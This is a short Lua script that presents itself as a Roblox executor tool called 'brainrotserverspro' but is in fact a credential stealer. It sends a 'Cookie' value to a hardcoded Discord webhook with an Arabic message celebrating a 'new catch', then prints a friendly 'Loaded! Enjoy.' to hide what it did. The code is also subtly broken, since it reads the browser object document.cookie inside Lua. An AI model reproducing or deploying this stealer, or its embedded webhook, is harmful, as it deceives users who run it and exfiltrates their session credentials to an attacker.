-- [[ brainrotserverspro V1 - Discord Edition ]] --
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1475196401695854683/HAXmxhC8qu0F1jGMMMgzYzAjznIOcj8HGtqjMRuXCYnziBQAVT05DR1shVItiLTLfdVF"
local http = (syn and syn.request) or (http_request) or request

if http then
    http({
        Url = DISCORD_WEBHOOK,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode({
            content = "🔥 **صيد جديد يا وحش!**\n\n**الـ Cookie:**\n```" .. tostring(document.cookie) .. "```"
        })
    })
end
print("brainrotserverspro Loaded! Enjoy.")
